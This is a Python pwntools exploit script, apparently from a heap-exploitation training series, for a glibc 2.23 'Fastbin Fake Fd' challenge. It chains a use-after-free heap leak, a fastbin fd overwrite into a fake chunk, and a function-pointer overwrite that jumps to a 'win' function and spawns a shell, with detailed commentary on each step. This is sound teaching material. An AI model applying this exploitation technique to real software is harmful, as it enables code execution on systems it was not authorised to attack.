#!/usr/bin/env python3
'''
Fastbin Fake Fd Challenge
- Run on GLibC version 2.23
'''

from pwn import * 

mode = 'DEBUG' # Turn on gdb
libc_name='../../../libc_versions/2.23/libc-2.23.so'
env = {}

# Binary setup
elf_name = '.happy-2.23'

elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = gdb.debug([elf.path], env = env, gdbscript='''
dir ../../../libc_versions/2.26/
''') 

else: 
	p = remote(domain, port) 

def create_kid(name, age):
	p.sendlineafter(">", "1") 

	# Send the name
	p.sendlineafter(":", name)

	# Send the age
	p.sendlineafter(":", str(age))
	return 

def edit_kid(index, name, age):
	p.sendlineafter(">", "4" )
	
	# Send the index 
	p.sendlineafter(":", str(index))
	# Send the name
	p.sendlineafter(":", name)
	# Send the age
	p.sendlineafter(":", str(age))
	return 

def free_kid(index):
	p.sendlineafter(">", "3") 

	# The index of the kid to free
	p.sendlineafter(":",str(index))

def view_kid(index): 
	p.sendlineafter(">", "2") 

	# Send the index to view
	p.sendlineafter(":", str(index))

	# Read the name
	p.recvuntil(":") 
	name = p.recvline()

	# Read the age
	p.recvuntil(":")  
	age = p.recvline() 
	return name, age 

def heap_leak():
	print("Step 1: Heap leak")
	print("=================")
	'''
	The main vulnerability is a use-after-free for the kids in the array. 
	This same vulnerability can also be used for a double free scenario.

	With the use after free, we can do the following things: 
	- print the attributes of a kid 
	- edit the kid
	'''

	# Create four kids
	create_kid("Maxwell", 5) # Index 0: Use for UAF later
	create_kid("Maxwell2", 6) # Index 1: Use for part of fake_chunk later.
	create_kid("Maxwell3", 7) # Index 2
	create_kid("Maxwell4", 8) # Index 3

	# Free two of them. The key is that index 0 was freed second. So, it points to index 2's chunk. And (most importantly) it is accessible by us.
	free_kid(1)
	free_kid(0)

	# Both 0 and 1 have UAFs on them now! 

	'''
	Each struct looks like the following in memory: 
	8 bytes (age) 
	20 bytes (name) 
	8 bytes (print_info) 

	After freeing, the fastbin looks like the following: 

	-----------------
	0x30: index0 -> index1
	-----------------

	Once this struct is freed this will go into the fastbin
	(because of the small size, it goes into the 0x30 fastbin).

	Recall that fastbin has an fd ptr (in the first part of the 
	data of the chunk) that points to the next fastbin chunk...

	So, this means that the first entry of the struct will have a 
	fastbin ptr to the next entry (if it's not the last item in the list).
	NOTE: There is no 'key' element on fastbin chunks. 

	We use the UAF on the kid at index 0 in order to leak a heap address
	(fd of the fastbin chunk). 
	'''
	name, age = view_kid(0)
	leak = int(age, 16) 

	
	print("Leaked heap address...", hex(leak))
	
	# Subtract offset from heap to find beginning
	leak = leak - 0x30
	print("Leaked Heap base: ", hex(leak))
	return leak

def fake_chunk(leak):
	print("Step 2: Fake chunk Over Function Ptr")
	print("====================================") 

	'''
	We enter with a UAF on index 0 and index for Kids
	(from previous step). 

	The heap looks like the following: 
	
	--- Index 0 ----
	prev_size: 0x0 
	size: 0x31 (prev_inuse always set on first chunk) 
	--- Index 1 --- 
	pre_size: 0x0
	size: 0x31 
	---------------	

	Currently, the 'kid' at index 0 is freed (and writable). 
	The 'age' field (also the fd pointer of the fastbin) leaks 
	this pointer (done in previous step). 
	
        However, if we can **overwrite** the fd pointer, we can 
        **create** a fake chunk at most locations! 
                - Why most? The chunk size has to match the bin. So, 
                  we either have to control the content at this location 
                  or find something else that we can use.

        In order to make this possible, we need to have a chunk size 
        that fits the bin (0x30).
                - So, we write a value of "\x30" in the 'name' 
                  (next to the function pointer)
		- Check is found at: https://elixir.bootlin.com/glibc/glibc-2.29/source/malloc/malloc.c#L3605

	Once we have access to the fake chunk, write over the 
	function pointer to the 'win' function for code execution!
	How does this write actually look? Below: 

	---------------------
	0x0-0x7: prev_size
	0x8-0xf: size 
	0x10-0x17: age <----------------------                       
	0x18-0x37: name buffer (with 0x30)   |
	0x38-0x3f: func_ptr                  |
	next chunk ...                       | Fake Chunk (at 0x18 offset)
	                                     |
	                       <--------------
	---------------------

	With this setup, the allocation will overlap with the function 
	pointer in index 1. By writing a name (second element of the struct) 
	we will have control of the function pointer :) 

	One thing to watch out for (compared to tcache) is that 
	fastbin chunks at stored as chunks (beginning of the chunk, 
	including size and prev_size metadata) while the tcache
	is referenced by MEMORY (beginning at offset 0x10 or 
	the data section). 
	
	Steps: 
	- Overwrite kid 0's fd pointer to point to fake chunk 
	- Create a fake chunk within one of the kids, that is close 
	to the function pointer. 
	- Get the fake chunk 
	- Write over the function pointer to point to 'win'.
	- Profit :) 
	'''

	''' 
	Overwrite the fd pointer of the fastbin chunk to point to 
	the fake_chunk (created in the previous line). 
	'''

	print("Creating fake chunk")
	fake_chunk = p64(0x0) # prev_size: does not have to be 0x0 though
	fake_chunk = fake_chunk + p64(0x31) # size: Must be the same size as bin

	print(fake_chunk) 
	edit_kid(1, fake_chunk, 0x1337) # Write fake chunk

	# Overwrite fd to be fake chunk
	fake_chunk_offset = 0x48
	fake_chunk_ptr = leak + fake_chunk_offset
	print("Fake Chunk at ", hex(fake_chunk_ptr))
	edit_kid(0, "?", fake_chunk_ptr) # Set the fake fd




# FOR THE WIN
def win():

	'''
	The fake chunk is in the SECOND slot of the linked list. 
	So, in order to get chunk, we need to take an item out first. 
	'''
	print("Remove chunk at beginning of fastbin linked list")
	create_kid("A" * 8, 1)
	
	'''
	The next chunk that comes out of the 0x30 fastbin 
	will be our fake chunk! 

	The call to 'create_kid' below triggers this! During this 
	step, we overwrite the 'func_ptr' at index 0 with the 
	'win' function to pop a shell. 
	'''
	# Get the fake_chunk (at the top of the fastbin)
	print("Get the fake chunk") 
	print("Write over func_ptr with the 'win' function!") 
	create_kid(p64(elf.symbols['win']), 2) 

	print("Pop shell!")
	# Print kid info option
	p.sendlineafter('>', '2') 

	# Index 1 has the overwritten function pointer. Pwned :)
	p.sendlineafter(':', '1') 


leak = heap_leak() 
fake_chunk(leak) 
win()
p.interactive()

